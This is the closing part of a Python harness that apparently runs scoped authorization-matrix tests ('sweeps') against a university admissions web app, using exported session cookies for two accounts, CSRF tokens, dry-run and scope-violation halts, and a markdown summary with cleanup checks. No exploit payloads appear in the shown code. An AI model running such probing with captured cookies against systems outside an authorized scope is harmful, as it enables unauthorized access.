        d = sweeps[s]
        lines.append(f"| {s} | {d['total']} | {d['200']} | {d['403']} | {d['anomaly']} |")
    lines.append("")
    lines.append("## Anomalies (expected-vs-actual)")
    lines.append("")
    if not anomalies:
        lines.append("_No anomalies flagged._")
    else:
        for a in anomalies:
            lines.append(f"- **Sweep {a['sweep']}** `{a['entity_or_endpoint']}` "
                         f"[{a['method']}] variant _{a['variant']}_ → status `{a['status']}` "
                         f"— flags: {a['notable_flags']}")
    lines.append("")
    lines.append("## Cleanup verification (Sweep 7)")
    cleanup_rows = [r for r in rows if r.get("sweep") == "7" and "CLEANUP_VERIFY" in r.get("method", "")]
    if cleanup_rows:
        bad = [r for r in cleanup_rows if not any("cleanup_ok=True" in f for f in r["notable_flags"])]
        lines.append(f"- {len(cleanup_rows)} fields verified; "
                     f"{'ALL reset to empty ✅' if not bad else f'{len(bad)} NOT confirmed empty ⚠️'}")
        for r in bad:
            lines.append(f"  - ⚠️ {r['entity_or_endpoint']} :: {r['variant']}")
    else:
        lines.append("- Sweep 7 not run in this matrix.")
    lines.append("")
    with open(out_path, "w", encoding="utf-8") as fh:
        fh.write("\n".join(lines) + "\n")
    return True


# ---------------------------------------------------------------------------
# main
# ---------------------------------------------------------------------------
SWEEP_FUNCS = {
    "1": sweep1, "2": sweep2, "3": sweep3, "4": sweep4,
    "5": sweep5, "6": sweep6, "7": sweep7, "8": sweep8,
}


def load_sessions(client, which=("A", "B")):
    sessions = {}
    for label in which:
        path = os.path.join(CREDS_DIR, f"{label}.cookies")
        if not os.path.exists(path):
            raise SystemExit(
                f"[HALT] missing session file: {path}\n"
                f"        The human must export fresh cookies for account {label} "
                f"(see brief §Setup) and drop them there. The IdP login is out of scope; "
                f"cookies are captured from the already-authenticated Admissions app.")
        sessions[label] = Session(label, load_cookie_header(path))
    # CSRF for the acting session(s)
    for s in sessions.values():
        client.fetch_csrf(s)
    return sessions


def main(argv=None):
    ap = argparse.ArgumentParser(description="KU Leuven Track B authz-matrix harness")
    ap.add_argument("--sweeps", default="1,2,3,4,5,6,7,8",
                    help="comma list of sweeps to run (default all)")
    ap.add_argument("--dry-run", action="store_true",
                    help="plan requests only; no network, no session needed")
    ap.add_argument("--summary-only", action="store_true",
                    help="rebuild the summary md from the existing jsonl")
    ap.add_argument("--insecure", action="store_true", help="skip TLS verify (debug only)")
    ap.add_argument("--append", action="store_true",
                    help="append to the existing jsonl instead of truncating it")
    args = ap.parse_args(argv)

    if args.summary_only:
        ok = build_summary()
        print("summary rebuilt" if ok else "no jsonl rows to summarize")
        return 0

    selected = [s.strip() for s in args.sweeps.split(",") if s.strip()]
    for s in selected:
        if s not in SWEEP_FUNCS:
            raise SystemExit(f"unknown sweep: {s}")

    client = Client(dry_run=args.dry_run, insecure=args.insecure)
    logger = MatrixLogger(JSONL_PATH, dry_run=args.dry_run, append=args.append)

    if args.dry_run:
        # dry-run: fabricate empty sessions so we can walk the request plan
        sessions = {"A": Session("A", "Cookie: <dry-run>"),
                    "B": Session("B", "Cookie: <dry-run>")}
        for s in sessions.values():
            s.csrf = "<dry-run-token>"
        print("[DRY-RUN] planning requests — no network calls, no session required.",
              file=sys.stderr)
    else:
        sessions = load_sessions(client)
        print(f"[LIVE] sessions loaded: {list(sessions)}; CSRF acquired.", file=sys.stderr)

    halted = None
    for s in selected:
        print(f"\n=== SWEEP {s} ===", file=sys.stderr)
        try:
            SWEEP_FUNCS[s](client, sessions, logger)
        except SessionExpired as e:
            halted = f"SESSION EXPIRED during sweep {s}: {e}"
            print(f"[HALT] {halted}", file=sys.stderr)
            break
        except ImmediateStop as e:
            # log the stop, skip the rest of THIS sweep, continue to next
            logger.log(s, "IMMEDIATE-STOP", "-", str(e),
                       {"status": "IMMEDIATE-STOP", "text": ""}, ["IMMEDIATE_STOP"])
            print(f"[IMMEDIATE-STOP] sweep {s}: {e} — skipping rest of class.", file=sys.stderr)
            continue
        except ScopeViolation as e:
            halted = f"SCOPE VIOLATION during sweep {s}: {e}"
            print(f"[FATAL] {halted}", file=sys.stderr)
            break

    if not args.dry_run:
        build_summary()
    print(f"\nWrote {'plan' if args.dry_run else 'matrix'}: "
          f"{PLAN_PATH if args.dry_run else JSONL_PATH}", file=sys.stderr)
    if halted:
        print(f"\n{halted}", file=sys.stderr)
        return 2
    return 0


if __name__ == "__main__":
    sys.exit(main())
